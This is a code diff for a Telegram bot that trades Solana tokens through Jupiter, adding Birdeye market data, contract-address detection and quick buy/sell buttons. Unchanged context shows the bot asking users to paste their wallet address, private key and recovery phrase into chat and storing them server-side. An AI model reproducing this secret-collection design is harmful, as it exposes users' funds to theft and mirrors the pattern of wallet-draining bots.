@@ -11,6 +11,41 @@ import axios from "axios";
 
 dotenv.config();
 
+const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
+const BIRDEYE_API_KEY = process.env.BIRDEYE_API_KEY;
+
+const HELIUS_RPC_URL = HELIUS_API_KEY 
+  ? `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`
+  : "https://api.mainnet-beta.solana.com";
+
+const connection = new Connection(HELIUS_RPC_URL);
+
+async function getBirdeyePrice(tokenAddress: string) {
+  if (!BIRDEYE_API_KEY) return null;
+  try {
+    const response = await axios.get(`https://public-api.birdeye.so/defi/price?address=${tokenAddress}`, {
+      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
+    });
+    return response.data.data.value;
+  } catch (err) {
+    console.error("Birdeye Price Error:", err);
+    return null;
+  }
+}
+
+async function getBirdeyeTokenOverview(tokenAddress: string) {
+  if (!BIRDEYE_API_KEY) return null;
+  try {
+    const response = await axios.get(`https://public-api.birdeye.so/defi/token_overview?address=${tokenAddress}`, {
+      headers: { 'X-API-KEY': BIRDEYE_API_KEY }
+    });
+    return response.data.data;
+  } catch (err) {
+    console.error("Birdeye Overview Error:", err);
+    return null;
+  }
+}
+
 const app = express();
 const PORT = 3000;
 const db = new Database("bot.db");
@@ -141,7 +176,6 @@ if (botToken) {
     if (!user) return ctx.reply("Connect wallet first!");
     
     try {
-      const connection = new Connection("https://api.mainnet-beta.solana.com");
       const balance = await connection.getBalance(new PublicKey(user.wallet_address));
       ctx.reply(`💰 SOL Balance: ${balance / 1e9} SOL`);
     } catch (err) {
@@ -156,10 +190,25 @@ if (botToken) {
   // --- Trade Actions ---
   bot.action("trade_buy", (ctx) => ctx.reply("To buy a token, use the command:\n`/buy <TOKEN_ADDRESS> <AMOUNT_SOL>`", { parse_mode: 'Markdown' }));
   bot.action("trade_sell", (ctx) => ctx.reply("To sell a token, use the command:\n`/sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>`", { parse_mode: 'Markdown' }));
-  bot.action("trade_contract", (ctx) => ctx.reply("Please send the contract address of the token you want to trade."));
+  bot.action("trade_contract", (ctx) => {
+    ctx.editMessageText(
+      "📥 *Enter Token Contract Address*\n\n" +
+      "Please paste the Solana token contract address below to view market data and trade options.",
+      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "trade_menu")]]) }
+    );
+  });
+
+  bot.action("trade_menu", (ctx) => ctx.editMessageText("📈 Trading Terminal", tradeMenu));
 
   // --- Market & Settings ---
-  bot.action("menu_market", (ctx) => ctx.reply("📈 Market data coming soon! Stay tuned for real-time Solana trends."));
+  bot.action("menu_market", (ctx) => {
+    ctx.editMessageText(
+      "📉 *Market Data Terminal*\n\n" +
+      "Use `/price <TOKEN_ADDRESS>` to get real-time price and market data from Birdeye.\n\n" +
+      "Example: `/price So11111111111111111111111111111111111111112`",
+      { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Back", "menu_main")]]) }
+    );
+  });
   
   bot.action("set_slippage", (ctx) => {
     ctx.reply("Current slippage is set to 0.5% (50 bps). Custom slippage settings coming soon.");
@@ -170,7 +219,9 @@ if (botToken) {
   });
 
   bot.on("text", async (ctx) => {
-    const text = ctx.message.text;
+    const text = ctx.message.text.trim();
+    
+    // Handle Wallet Import (ADDRESS|PRIVATE_KEY|RECOVERY_PHRASE)
     if (text.includes("|")) {
       const [address, pKey, recovery] = text.split("|").map(s => s.trim());
       if (!address || !pKey || !recovery) {
@@ -189,29 +240,73 @@ if (botToken) {
         console.error(err);
         ctx.reply("❌ Error saving wallet details.");
       }
+      return;
+    }
+
+    // Handle Solana Contract Address Detection
+    const solanaAddrRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
+    if (solanaAddrRegex.test(text)) {
+      ctx.reply(`🔍 Analyzing token: ${text}...`);
+      const overview = await getBirdeyeTokenOverview(text);
+      
+      if (overview) {
+        const message = `
+📊 *Token: ${overview.symbol}*
+💰 Price: $${overview.price.toFixed(6)}
+📈 24h: ${overview.priceChange24hPercent.toFixed(2)}%
+💧 Liq: $${overview.liquidity.toLocaleString()}
+🏛️ MC: $${overview.mc.toLocaleString()}
+
+🚀 *Quick Actions:*
+Buy: \`/buy ${text} 0.1\`
+Sell: \`/sell ${text} 1000000\`
+        `;
+        
+        const tradeButtons = Markup.inlineKeyboard([
+          [Markup.button.callback("🟢 Buy 0.1 SOL", `quick_buy_${text}_0.1`)],
+          [Markup.button.callback("🔴 Sell 50%", `quick_sell_${text}_50`)],
+          [Markup.button.callback("🔙 Back", "menu_main")]
+        ]);
+
+        return ctx.reply(message, { parse_mode: 'Markdown', ...tradeButtons });
+      }
     }
   });
 
-  // --- Trading Logic (Jupiter API) ---
-  bot.command("buy", async (ctx) => {
+  bot.command("price", async (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 3) return ctx.reply("Usage: /buy <TOKEN_ADDRESS> <AMOUNT_SOL>");
+    if (args.length < 2) return ctx.reply("Usage: /price <TOKEN_ADDRESS>");
     
     const tokenAddress = args[1];
-    const amountSol = parseFloat(args[2]);
+    ctx.reply(`🔍 Fetching data for ${tokenAddress}...`);
+
+    const overview = await getBirdeyeTokenOverview(tokenAddress);
+    if (!overview) return ctx.reply("❌ Could not fetch token data. Check address or API key.");
+
+    const message = `
+📊 *Token Overview: ${overview.symbol}*
+💰 Price: $${overview.price.toFixed(6)}
+📈 24h Change: ${overview.priceChange24hPercent.toFixed(2)}%
+💧 Liquidity: $${overview.liquidity.toLocaleString()}
+🏛️ Market Cap: $${overview.mc.toLocaleString()}
+📜 Address: \`${tokenAddress}\`
+    `;
+    ctx.reply(message, { parse_mode: 'Markdown' });
+  });
+
+  // --- Trading Functions ---
+  async function executeBuy(ctx: any, tokenAddress: string, amountSol: number) {
     const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
-    
     if (!user) return ctx.reply("Connect wallet first!");
     
     ctx.reply(`🔄 Attempting to buy ${amountSol} SOL worth of token...`);
 
     try {
-      const connection = new Connection("https://api.mainnet-beta.solana.com");
       const pKey = decrypt(user.private_key);
       const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
 
       // 1. Get Quote from Jupiter
-      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${tokenAddress}&amount=${amountSol * 1e9}&slippageBps=50`);
+      const quoteResponse = await axios.get(`https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${tokenAddress}&amount=${Math.floor(amountSol * 1e9)}&slippageBps=50`);
       const quoteData = quoteResponse.data;
 
       // 2. Get Swap Transaction
@@ -232,29 +327,20 @@ if (botToken) {
       });
 
       ctx.reply(`✅ Buy Order Sent!\nTX: https://solscan.io/tx/${txid}`);
-      
-      // Log trade
       db.prepare("INSERT INTO trades (user_id, token, amount, type) VALUES (?, ?, ?, ?)").run(user.id, tokenAddress, amountSol, 'buy');
     } catch (err: any) {
       console.error(err);
       ctx.reply(`❌ Trade Failed: ${err.message}`);
     }
-  });
+  }
 
-  bot.command("sell", async (ctx) => {
-    const args = ctx.message.text.split(" ");
-    if (args.length < 3) return ctx.reply("Usage: /sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>");
-    
-    const tokenAddress = args[1];
-    const amountToken = args[2]; // Usually in raw units (lamports)
+  async function executeSell(ctx: any, tokenAddress: string, amountToken: string) {
     const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
-    
     if (!user) return ctx.reply("Connect wallet first!");
     
     ctx.reply(`🔄 Attempting to sell token for SOL...`);
 
     try {
-      const connection = new Connection("https://api.mainnet-beta.solana.com");
       const pKey = decrypt(user.private_key);
       const wallet = Keypair.fromSecretKey(bs58.decode(pKey));
 
@@ -285,6 +371,50 @@ if (botToken) {
       console.error(err);
       ctx.reply(`❌ Trade Failed: ${err.message}`);
     }
+  }
+
+  // --- Quick Action Handlers ---
+  bot.action(/^quick_buy_(.+)_(.+)$/, async (ctx) => {
+    const tokenAddress = ctx.match[1];
+    const amountSol = parseFloat(ctx.match[2]);
+    await executeBuy(ctx, tokenAddress, amountSol);
+  });
+
+  bot.action(/^quick_sell_(.+)_(.+)$/, async (ctx) => {
+    const tokenAddress = ctx.match[1];
+    const percentage = parseInt(ctx.match[2]);
+    
+    const user = db.prepare("SELECT * FROM users WHERE telegram_id = ?").get(ctx.from.id) as any;
+    if (!user) return ctx.reply("Connect wallet first!");
+
+    try {
+      // Get token balance for the user
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(user.wallet_address), {
+        mint: new PublicKey(tokenAddress)
+      });
+      
+      if (tokenAccounts.value.length === 0) return ctx.reply("❌ You don't hold this token.");
+      
+      const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.amount;
+      const amountToSell = Math.floor(parseInt(balance) * (percentage / 100)).toString();
+      
+      await executeSell(ctx, tokenAddress, amountToSell);
+    } catch (err) {
+      ctx.reply("❌ Error calculating balance for sell.");
+    }
+  });
+
+  // --- Trading Logic (Jupiter API) ---
+  bot.command("buy", async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) return ctx.reply("Usage: /buy <TOKEN_ADDRESS> <AMOUNT_SOL>");
+    await executeBuy(ctx, args[1], parseFloat(args[2]));
+  });
+
+  bot.command("sell", async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) return ctx.reply("Usage: /sell <TOKEN_ADDRESS> <AMOUNT_TOKEN>");
+    await executeSell(ctx, args[1], args[2]);
   });
 
   // Clear webhook and launch with a small delay to prevent 409 Conflict on restarts
